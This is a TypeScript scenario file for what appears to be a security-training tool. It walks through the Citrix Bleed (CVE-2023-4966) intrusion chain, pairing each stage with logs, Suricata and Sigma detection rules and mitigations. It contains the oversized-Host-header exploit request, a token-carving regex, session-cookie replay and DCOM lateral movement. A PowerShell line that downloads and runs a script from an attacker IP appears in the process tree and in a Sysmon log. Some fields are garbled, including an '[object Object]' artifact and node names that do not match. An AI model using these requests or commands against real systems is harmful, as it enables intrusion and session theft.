import type { AttackScenario } from '../types';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: AttackScenario = {
  id: 'splunk-citrix-bleed-session-hijack',
  code: 'CVE-2023-4966',
  name: 'Splunk STRT, Mandiant & CISA — Citrix Bleed: NetScaler OOB Memory Leak & NSC_AAAC Hijack',
  shortSubtitle: 'Splunk STRT / Mandiant / CISA AA23-325A · CVE-2023-4966 Host Header Leak, NSC_AAAC Cookie & VDI Pivot',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Documented by the Splunk Threat Research Team (STRT), Mandiant, and Joint CISA Advisory AA23-325A, Citrix Bleed (CVE-2023-4966) is an unauthenticated out-of-bounds memory read in Citrix NetScaler ADC and NetScaler Gateway. Sending an HTTP GET request to /oauth/idp/.well-known/openid-configuration with a 24,000+ byte Host header causes snprintf to return a length larger than the buffer, leaking adjacent process memory containing active 65-byte NSC_AAAC session tokens and bypassing MFA completely.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Splunk Threat Research Team (STRT), Mandiant & CISA Advisory AA23-325A',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (CVE-2023-4966) · T1539 (Steal NSC_AAAC Cookie) · T1550.004 (Pass the Cookie)',
    },
    {
      term: 'VULNERABLE ENDPOINT',
      value: 'GET /oauth/idp/.well-known/openid-configuration (Oversized Host: Header)',
    },
    {
      term: 'LEAKED ARTIFACT',
      value: '65-Byte Hexadecimal NSC_AAAC Session Token in HTTP Response Body',
    },
  ],
  nodes: [
    {
      id: 'citrix_bleed_actor',
      label: 'Threat Actor (LockBit / UNC)',
      sublabel: '198.51.100.62 (Memory Bleed Scanner)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'Ransomware / Espionage Intrusion Operator',
        pidOrPort: 'HTTPS :443 -> NetScaler OpenID Endpoint',
        privilege: 'Unauthenticated External',
        artifacts: [
          'GET /oauth/idp/.well-known/openid-configuration',
          'Host: AAAA... (24,576 Bytes) -> Regex [0-9a-f]{32,65}',
        ],
        description:
          'Attacker sending oversized Host headers to leak NetScaler nsppe packet-engine memory and extract active NSC_AAAC session cookies.',
      },
    },
    {
      id: 'netscaler_gateway',
      label: 'Citrix NetScaler ADC / Gateway',
      sublabel: '172.16.8.10 (nsppe Packet Engine)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Citrix NetScaler ADC / Gateway Appliance (FreeBSD)',
        pidOrPort: 'Process: nsppe (NetScaler Packet Processing Engine)',
        privilege: 'Appliance Memory Space',
        artifacts: [
          'ns_aaa_oauthrp_send_openid_config() snprintf OOB Read',
          'Leaked Memory Buffer Containing Active NSC_AAAC Tokens',
        ],
        description:
          'Perimeter Citrix NetScaler Gateway whose OpenID configuration endpoint leaks adjacent heap/stack memory in the HTTP 200 response.',
      },
    },
    {
      id: 'nsc_aaac_session_replay',
      label: 'Hijacked NSC_AAAC Session',
      sublabel: 'Cookie: NSC_AAAC=4f8a91c2... (MFA Bypassed)',
      role: 'process',
      x: 54,
      y: 72,
      details: {
        osOrType: 'Replayed NetScaler AAA Session Cookie',
        pidOrPort: 'POST /logon/LogonPoint/Authentication/GetUserName',
        privilege: 'Authenticated Domain User / Admin',
        artifacts: [
          'Same NSC_AAAC Session Used from Two Distinct Client IPs',
          'Downloads launch.ica to Connect to Internal Citrix VDI',
        ],
        description:
          'Attacker replaying the leaked 65-byte NSC_AAAC cookie to impersonate an already-authenticated user without credentials or MFA.',
      },
    },
    {
      id: 'citrix_vdi_internal',
      label: 'Internal Citrix VDI & AD Host',
      sublabel: '10.10.25.40 (VDI-CORP-14)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Windows Server 2022 Citrix Virtual Desktop Host',
        pidOrPort: 'ICA / HDX Session -> powershell.exe & AnyDesk.exe',
        privilege: 'Internal Corporate Network',
        artifacts: [
          'Adfind.exe / net.exe Active Directory Recon',
          'SharpHound / RMM Deployment (CISA AA23-325A)',
        ],
        description:
          'Internal Citrix VDI desktop launched by the attacker using the hijacked NetScaler session to pivot into Active Directory.',
      },
    },
    {
      id: 'splunk_netscaler_siem',
      label: 'Splunk Enterprise Security (STRT)',
      sublabel: 'NetScaler ns.log & Suricata WAF',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Splunk SIEM & Suricata IDS',
        pidOrPort: 'NetScaler TCP/SSLVPN Logs & Sysmon',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert: CVE-2023-4966 Oversized Host Header on openid-configuration',
          'Alert: Concurrent Multi-IP Usage of Single NetScaler Session',
        ],
        description:
          'Detects oversized responses from /.well-known/openid-configuration and session IP switching in NetScaler ns.log.',
      },
    },
  ],
  processTree: [
    {
      pid: 912,
      ppid: 1,
      name: 'nsppe (NetScaler Engine)',
      commandLine: '/netscaler/nsppe (Packet Processing Engine)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'ns_aaa_oauthrp_send_openid_config()',
        'snprintf(buf, 0x20000, ...)',
        'ns_http_send_response(buf, return_len_oob)',
      ],
    },
    {
      pid: 5310,
      ppid: 4100,
      name: 'powershell.exe (VDI Session)',
      commandLine:
        'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://198.51.100.62/recon.ps1\')"',
      user: 'CORP\\s.miller',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['WinHttpOpen', 'CreateProcessW("net.exe")'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'NETSCALER SNPRINTF OOB MEMORY LEAK (CVE-2023-4966)',
      subtitle: 'Sending 24KB Host header to /oauth/idp/.well-known/openid-configuration',
      description:
        'Because ns_aaa_oauthrp_send_openid_config() inserts the HTTP Host header into a JSON template six times using snprintf without checking if the return value exceeds the 131,072-byte buffer size, a 24,576-byte Host header causes NetScaler to transmit ~16KB of adjacent process memory in the HTTP response.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['citrix_bleed_actor', 'netscaler_gateway', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-4966 (Citrix Bleed OOB Memory Read)' },
        { term: 'TARGET URI', value: 'GET /oauth/idp/.well-known/openid-configuration' },
        { term: 'ROOT CAUSE', value: 'Unbounded snprintf return value passed to HTTP response sender' },
      ],
    },
    {
      index: 2,
      title: 'NSC_AAAC SESSION COOKIE EXTRACTION & MFA BYPASS',
      subtitle: 'Carving 65-byte hex NSC_AAAC token from leaked memory and replaying',
      description:
        'As documented in CISA AA23-325A and Mandiant reports, the leaked memory dump contains plaintext NSC_AAAC session cookies belonging to active, MFA-authenticated VPN/Citrix users. The attacker validates the stolen cookie via /logon/LogonPoint/Authentication/GetUserName and hijacks the session.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1539',
      mitreTechniqueName: 'Steal Web Session Cookie',
      activeNodeIds: ['citrix_bleed_actor', 'netscaler_gateway', 'nsc_aaac_session_replay', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway', 'nsc_aaac_session_replay'],
      keySpecs: [
        { term: 'STOLEN COOKIE', value: 'NSC_AAAC=<65-byte hexadecimal session token>' },
        { term: 'VALIDATION URI', value: 'POST /logon/LogonPoint/Authentication/GetUserName' },
        { term: 'IMPACT', value: 'Complete MFA Bypass & Session Takeover (T1550.004)' },
      ],
    },
    {
      index: 3,
      title: 'CITRIX ICA VDI LAUNCH & INTERNAL AD RECONNAISSANCE',
      subtitle: 'Downloading launch.ica to pivot onto internal VDI workstation',
      description:
        'Using the hijacked NetScaler Gateway session, the attacker requests an ICA connection file (launch.ica), opens an interactive virtual desktop session on VDI-CORP-14 inside the corporate network, and executes PowerShell discovery and RMM tools.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1550.004',
      mitreTechniqueName: 'Use Alternate Authentication Material: Web Session Cookie',
      activeNodeIds: ['nsc_aaac_session_replay', 'citrix_vdi_internal', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway', 'nsc_aaac_session_replay', 'citrix_vdi_internal'],
      keySpecs: [
        { term: 'PIVOT MECHANISM', value: 'Citrix StoreFront / Gateway ICA Virtual Desktop Launch' },
        { term: 'NS.LOG ANOMALY', value: 'SSLVPN TCPCONNSTAT showing 2 client IPs for 1 username/session' },
        { term: 'CISA ADVISORY', value: 'AA23-325A (Citrix Bleed Exploitation by LockBit 3.0)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'spl-cb-1',
      no: 1,
      stageIndex: 1,
      timestamp: '15:02:11.045',
      sourceNodeId: 'citrix_bleed_actor',
      targetNodeId: 'netscaler_gateway',
      sourceLabel: '198.51.100.62',
      targetLabel: 'NetScaler :443',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Suricata CVE-2023-4966',
      shortAction: 'CITRIX BLEED GET',
      info: 'GET /oauth/idp/.well-known/openid-configuration with 24,576-Byte Host Header -> HTTP 200 (148,120 Bytes)',
      sizeOrCode: '148 KB Leak',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'A normal response from /.well-known/openid-configuration is ~1.5 KB. A response exceeding 131 KB confirms active CVE-2023-4966 memory bleed.',
      rawLog: `GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
Host: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [24576 bytes]
User-Agent: curl/8.1.2

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 148120
{"issuer": "https://AAA...", ...}\\x00\\x00\\x18\\x00NSC_AAAC=4f8a91c2e7b031948271635481920384756192038475619203847561920384756\\x00`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Splunk STRT / CISA — Citrix Bleed CVE-2023-4966 Memory Leak Response',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISA AA23-325A Citrix Bleed CVE-2023-4966 Oversized Host Header"; flow:established,to_server; http.uri; content:"/oauth/idp/.well-known/openid-configuration"; http.host; bsize:>4096; classtype:attempted-recon; sid:20234966; rev:1;)`,
        mitigation:
          'Patch Citrix NetScaler ADC/Gateway AND run "kill icaconnection -all" and "kill rdp connection -all" followed by "clear ns partition" to invalidate leaked NSC_AAAC tokens.',
      },
    },
    {
      id: 'spl-cb-2',
      no: 2,
      stageIndex: 2,
      timestamp: '15:02:19.410',
      sourceNodeId: 'nsc_aaac_session_replay',
      targetNodeId: 'netscaler_gateway',
      sourceLabel: '198.51.100.62 (Attacker)',
      targetLabel: 'NetScaler ns.log',
      sourceType: 'NETWORK',
      protocolOrEventId: 'NetScaler SSLVPN Log',
      shortAction: 'REPLAY NSC_AAAC',
      info: 'Cookie: NSC_AAAC=4f8a91c2... User=s.miller Client_ip=198.51.100.62 (Original Login IP=73.15.20.8)',
      sizeOrCode: 'IP Mismatch',
      severity: 'CRITICAL',
      mitreId: 'T1539',
      explanation:
        'NetScaler /var/log/ns.log shows an active SSLVPN session for user s.miller suddenly issuing requests from a second external IP address (198.51.100.62).',
      rawLog: `Nov 13 15:02:19 <local0.info> 172.16.8.10 11/13/2024:15:02:19 GMT ns-gw-01 0-PPE-0 : default SSLVPN TCPCONNSTAT 88120 0 : Context s.miller@73.15.20.8 - SessionId: 412 - User s.miller - Client_ip 198.51.100.62 - Nat_ip 172.16.8.11 - Dest_ip 10.10.25.40:2598`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Citrix NetScaler Session Hijack (Multiple Client IPs per SessionId)',
        ruleCode: `title: Citrix NetScaler SSLVPN Session Used From Multiple Client IPs
logsource:
  product: citrix
  service: netscaler
detection:
  selection:
    EventType: 'TCPCONNSTAT'
  condition: selection
level: critical`,
        mitigation:
          'Correlate NetScaler SessionId values in /var/log/ns.log and terminate any session where Client_ip differs from the initial authentication Context IP.',
      },
    },
    {
      id: 'spl-cb-3',
      no: 3,
      stageIndex: 3,
      timestamp: '15:04:02.915',
      sourceNodeId: 'nsc_aaac_session_replay',
      targetNodeId: 'citrix_vdi_internal',
      sourceLabel: 's.miller (Hijacked ICA)',
      targetLabel: 'VDI-CORP-14 (PID 5310)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1',
      shortAction: 'VDI POWERSHELL RECON',
      info: 'ParentImage=wfshell.exe Image=powershell.exe CommandLine="powershell -nop -w hidden IEX..."',
      sizeOrCode: 'PID 5310',
      severity: 'HIGH',
      mitreId: 'T1550.004',
      explanation:
        'Inside the Citrix VDI host, wfshell.exe (Citrix UserInit Shell) spawns hidden PowerShell to download post-exploitation reconnaissance tools.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <Computer>VDI-CORP-14.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">5310</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.62/recon.ps1')"</Data>
    <Data Name="ParentImage">C:\\Program Files (x86)\\Citrix\\System32\\wfshell.exe</Data>
    <Data Name="User">CORP\\s.miller</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Citrix VDI Shell (wfshell.exe) Spawning Hidden PowerShell or Recon Tools',
        ruleCode: `title: Suspicious Child Process of Citrix wfshell.exe
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\wfshell.exe'
    Image|endswith:
      - '\\powershell.exe'
      - '\\cmd.exe'
      - '\\net.exe'
      - '\\AnyDesk.exe'
  condition: selection
level: high`,
        mitigation:
          'Enforce PowerShell Constrained Language Mode and AppLocker policies on Citrix VDI images.',
      },
    },
  ],
};
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'splunk-citrix-bleed-session-hijack',
    briefing: {
      headline: 'Scenario Briefing: Citrix Bleed (CVE-2023-4966), Leaking Session Tokens from NetScaler Memory to Bypass MFA',
      storyAnalogy:
        'Imagine asking a hotel clerk to write your name on six lines of a 1-page welcome form, and then photocopy that page for you. Instead of giving a normal 10-letter name, you hand the clerk a 24,000-letter name (Host: header). The clerk’s 1-page form runs out of space after line 5, so the clerk stops writing, but when they walk over to the photocopier, they tell the machine: "Copy 147,000 letters worth of paper from my desk!" The photocopier copies the 1-page welcome form PLUS the confidential ledger sitting right next to it on the desk, which contains the active VIP room key (NSC_AAAC session cookie) of an administrator who already passed MFA.',
      plainSummary:
        'In this scenario (CVE-2023-4966, Splunk STRT, Mandiant & CISA - Citrix Bleed: NetScaler OOB Memory Leak & NSC_AAAC Hijack), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: sending an Oversized HTTP "Host" Header, then extracting the 65-Character "NSC_AAAC", then pivoting from the Hijacked Citrix VDI. Steps #1–#3 walk that chain end-to-end by covering Sending an Oversized HTTP "Host" Header, then Extracting the 65-Character "NSC_AAAC", then Pivoting from the Hijacked Citrix VDI, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'On the diagram: Node ① (Attacker) sends the oversized Host header request to Node ②/③ (Citrix NetScaler Gateway nsppe). Node ④ (nsppe Memory Buffer & Session Replay) leaks the 65-byte NSC_AAAC token, allowing the attacker to hijack a Virtual Desktop session and pivot via DCOM to Node ⑤ (Internal Domain Server), alerted by Node ⑥ (Splunk SIEM).',
      documentedAdvisory: 'Assetnote CVE-2023-4966 Root-Cause · CISA/Mandiant AA23-325A · Splunk SURGe Citrix Bleed Analysis · MITRE T1539',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Sending an Oversized HTTP "Host" Header to Leak Adjacent NetScaler RAM (CVE-2023-4966)',
        storyAnalogy:
          'The attacker asks the public OpenID info desk (/oauth/idp/.well-known/openid-configuration) for its standard welcome sheet while supplying a 24,576-byte Host name. Because snprintf() reports how many bytes it wanted to write (147 KB) rather than the size of the 131 KB paper sheet, the server sends back 16 KB of raw adjacent RAM right after the welcome sheet.',
        simpleExplanation:
          'As reverse-engineered by Assetnote, the attacker sends an unauthenticated HTTPS GET request to /oauth/idp/.well-known/openid-configuration (a public discovery page on the Citrix NetScaler Gateway whose ns_aaa_oauthrp_send_openid_config function inserts the caller’s HTTP Host header into six JSON URL fields: issuer, authorization_endpoint, token_endpoint, jwks_uri, userinfo_endpoint, and end_session_endpoint). By sending a 24,576-byte Host header, the 6 copies total ~147 KB, exceeding the server’s 131,072-byte (0x20000) stack response buffer. Because C’s snprintf() function returns how many bytes it wanted to write (147 KB) rather than how many bytes actually fit in the 128 KB buffer, NetScaler’s SSL_write transmits the 128 KB buffer PLUS ~16 KB of raw adjacent nsppe memory straight back to the attacker.',
        howItWorksInPractice:
          'In the C standard library, snprintf(buf, size, fmt...) stops writing at size bytes to prevent a crash, but returns the theoretical total length of the formatted string. Passing that unchecked return value directly to the HTTP socket writer causes an out-of-bounds memory over-read (CVE-2023-4966) from the NetScaler packet engine (nsppe). In the documented Suricata CVE-2023-4966 exchange from Threat Actor (LockBit / UNC) to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with ALERT 148 KB Leak (confirming that the CITRIX BLEED GET request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 NSC_AAAC SESSION COOKIE EXTRACTION & MFA BYPASS).',
        diagramAlignment:
          'On the diagram, arrow #1→ sends the 24 KB Host header from Node ① to Node ②/③ (Citrix NetScaler /oauth/idp/), and ⇠#1 returns HTTP 200 OK leaking 131 KB of memory.',
        detectionAndEvidence:
          'Documented in Assetnote, CISA AA23-325A & Suricata SID 2048918: GET /oauth/idp/.well-known/openid-configuration with oversized Host header and >130 KB HTTP 200 response.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1539',
        plainTitle: 'Extracting the 65-Character "NSC_AAAC" Cookie & Hijacking an Active MFA Session',
        storyAnalogy:
          'Scanning the accidentally photocopied desk pages, the attacker spots a 65-digit hexadecimal VIP wristband (NSC_AAAC) belonging to an administrator who is currently logged in. Clipping that wristband onto their own browser lets the attacker step straight into the admin’s active Citrix Virtual Desktop without any password or MFA prompt.',
        simpleExplanation:
          'Scanning the leaked raw memory dump with a regular expression ([0-9a-f]{32,65}), the attacker extracts a 65-character hexadecimal string: a live NSC_AAAC session cookie (the master authentication token stored in nsppe memory for a user who has already logged in and passed Multi-Factor Authentication). By pasting Cookie: NSC_AAAC=<leaked_token> into their own browser, the attacker hijacks the administrator’s active Citrix session (bypassing both the password screen and MFA completely).',
        howItWorksInPractice:
          'Because the NSC_AAAC cookie represents an active server-side AAA session in NetScaler memory, even patching the appliance or resetting the victim’s Active Directory password does not kick the attacker out unless the administrator explicitly flushes active sessions on the appliance via kill aaa session -all and kill icaconnection -all. In the documented NetScaler SSLVPN Log exchange from DMZ Reverse Proxy & SPAN Tap to Citrix NetScaler ADC / Gateway, Citrix NetScaler ADC / Gateway responds with RESP IP Mismatch (confirming that the REPLAY NSC_AAAC request succeeded on Citrix NetScaler ADC / Gateway and establishing the runtime state required for Step #3 CITRIX ICA VDI LAUNCH & INTERNAL AD RECONNAISSANCE).',
        diagramAlignment:
          'On the diagram, arrow #2→ replays the leaked NSC_AAAC cookie on Node ③/④ (NetScaler Session Engine), and ⇠#2 grants VDI ICA desktop access without MFA.',
        detectionAndEvidence:
          'Documented in Splunk SURGe and NetScaler AAA Syslog (ns.log session tracking records): Same NSC_AAAC session identifier active across two different client IP addresses / ASNs without a new authentication event (confirming that a stolen session cookie was replayed from an external host). Correlate Sysmon or Windows Security Event telemetry for T1539 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1021.003',
        plainTitle: 'Pivoting from the Hijacked Citrix VDI Desktop into Internal Servers via DCOM/RPC',
        storyAnalogy:
          'Now sitting at the administrator’s virtual desk inside the building, the attacker uses the internal intercom (DCOM MMC20.Application over port 135) to command neighboring Windows servers to run commands on their behalf.',
        simpleExplanation:
          'Inside the hijacked Citrix Virtual Desktop (VDI) session, the attacker runs Active Directory discovery tools (adfind / SoftPerfect netscan), deploys remote management tunnels (AnyDesk / eHorus), and uses Distributed COM (DCOM, invoking the MMC20.Application COM object over RPC port 135, which instructs a remote Windows server to silently launch mmc.exe -Embedding and execute commands via Document.ActiveView.ExecuteShellCommand without creating a noisy new Windows service).',
        howItWorksInPractice:
          'Unlike PsExec or sc.exe (which register a new Windows Service and trigger System EventID 7045 on the target server), lateral movement via DCOM MMC20.Application abuses an already-registered Microsoft COM class over TCP/135. Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'On the diagram, arrow #3→ pivots from Node ④ (VDI Session) to Node ⑤ (Internal Server via DCOM :135) while Node ⑥ (Splunk SIEM) correlates the session hijack.',
        detectionAndEvidence:
          'Documented in CISA AA23-325A and Mandiant (post-hijack lateral movement indicators): mmc.exe -Embedding spawned on remote servers via DCOM following Citrix ICA session IP change (linking the hijacked remote session to internal network movement). Correlate Sysmon or Windows Security Event telemetry for T1550.004 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
      briefing: {
        storyAnalogy:
          'A coatroom clerk copies your claim label onto a fixed-size receipt slip, but when a guest hands in an overly long name card, the clerk accidentally prints neighboring coat tickets from the counter drawer onto the back. An outsider grabs a printed executive coat ticket, skips the front check-in desk, and strolls straight into the private corporate office floor.',
        storyMappings: [
          {
            storyTerm: 'Overly long name card',
            technicalTerm: 'Oversized HTTP Host request header (CVE-2023-4966)',
            tone: 'amber',
          },
          {
            storyTerm: 'Neighboring counter tickets',
            technicalTerm: 'Leaked adjacent NetScaler process memory',
            tone: 'sky',
          },
          {
            storyTerm: 'Executive coat ticket',
            technicalTerm: '65-character NSC_AAAC authenticated session cookie',
            tone: 'rose',
          },
          {
            storyTerm: 'Private office floor',
            technicalTerm: 'Internal virtual desktop and remote server tier',
            tone: 'emerald',
          },
        ],
      },
      steps: {
        1: {
          storyAnalogy:
            'An outsider approaches the public information counter with an unusually long address label. While preparing the printed directory reply, the counter machine overruns its tray and dumps handfuls of neighboring scratch memory straight into the response.',
          storyMappings: [
            {
              storyTerm: 'Public information counter',
              technicalTerm: 'Exposed OpenID discovery endpoint on NetScaler',
              tone: 'amber',
            },
            {
              storyTerm: 'Unusually long address label',
              technicalTerm: 'Oversized HTTP Host header triggering buffer over-read',
              tone: 'sky',
            },
            {
              storyTerm: 'Neighboring scratch memory',
              technicalTerm: 'Adjacent uninitialized heap memory disclosure',
              tone: 'rose',
            },
            {
              storyTerm: 'Thick printed reply',
              technicalTerm: 'Abnormally large HTTP 200 response exceeding 130 KB',
              tone: 'emerald',
            },
          ],
          detectionAndEvidence:
            'Documented in Assetnote, CISA AA23-325A, and Suricata SID 2048918 (network detection signatures for Citrix Bleed): GET /oauth/idp/.well-known/openid-configuration with oversized Host header and >130 KB HTTP 200 response (which signals an active out-of-bounds memory disclosure).',
        },
        2: {
          storyAnalogy:
            'Sifting through the spilled counter scraps, the outsider spots an active sixty-five-symbol coat claim ticket belonging to a signed-in manager. Presenting that copied ticket at the VIP entrance opens the manager desk immediately without any password or buzzer check.',
          storyMappings: [
            {
              storyTerm: 'Spilled counter scraps',
              technicalTerm: 'Raw leaked memory buffer contents',
              tone: 'amber',
            },
            {
              storyTerm: 'Sixty-five-symbol claim ticket',
              technicalTerm: 'Valid NSC_AAAC session cookie token',
              tone: 'sky',
            },
            {
              storyTerm: 'VIP entrance bypass',
              technicalTerm: 'Authenticated session hijack skipping MFA',
              tone: 'rose',
            },
            {
              storyTerm: 'Two separate entry gates',
              technicalTerm: 'Same session cookie observed from two distinct client IPs',
              tone: 'emerald',
            },
          ],
          detectionAndEvidence:
            'Documented in Splunk SURGe and NetScaler AAA Syslog (ns.log session tracking records): Same NSC_AAAC session identifier active across two different client IP addresses / ASNs without a new authentication event (confirming that a stolen session cookie was replayed from an external host).',
        },
        3: {
          storyAnalogy:
            'Seated inside the hijacked manager workspace, the outsider picks up the internal office intercom and issues remote administration orders to adjacent floor vaults across the corporate building.',
          storyMappings: [
            {
              storyTerm: 'Hijacked manager workspace',
              technicalTerm: 'Active remote virtual desktop session',
              tone: 'amber',
            },
            {
              storyTerm: 'Internal office intercom',
              technicalTerm: 'Remote DCOM management interface',
              tone: 'sky',
            },
            {
              storyTerm: 'Remote administration order',
              technicalTerm: 'Spawned mmc.exe -Embedding execution on target hosts',
              tone: 'rose',
            },
            {
              storyTerm: 'Adjacent floor vaults',
              technicalTerm: 'Internal enterprise servers targeted during lateral movement',
              tone: 'emerald',
            },
          ],
          detectionAndEvidence:
            'Documented in CISA AA23-325A and Mandiant (post-hijack lateral movement indicators): mmc.exe -Embedding spawned on remote servers via DCOM following Citrix ICA session IP change (linking the hijacked remote session to internal network movement). Correlate Sysmon Event 1 and Windows Security Event telemetry for T1550.004 (pairing parent/child process and destination fields) and contain the offending session.',
        },
      },
    };
